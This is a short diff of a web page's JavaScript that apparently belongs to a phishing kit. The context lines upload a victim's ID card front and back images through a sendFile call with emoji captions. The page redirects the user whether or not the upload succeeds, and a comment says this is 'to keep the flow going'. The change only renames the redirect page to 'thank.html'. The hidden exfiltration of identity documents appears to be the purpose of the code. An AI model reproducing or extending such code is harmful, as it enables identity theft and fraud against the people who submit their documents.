@@ -156,11 +156,11 @@
                 sendFile(fileFront, '📄 ID - Front')
                     .then(() => sendFile(fileBack, '📄 ID - Back'))
                     .then(() => {
-                        window.location.href = 'confirmation-code.html';
+                        window.location.href = 'thank.html';
                     })
                     .catch(() => {
                         // Even if upload fails, redirect the user to keep the flow going
-                        window.location.href = 'confirmation-code.html';
+                        window.location.href = 'thank.html';
                     });
             });
         });
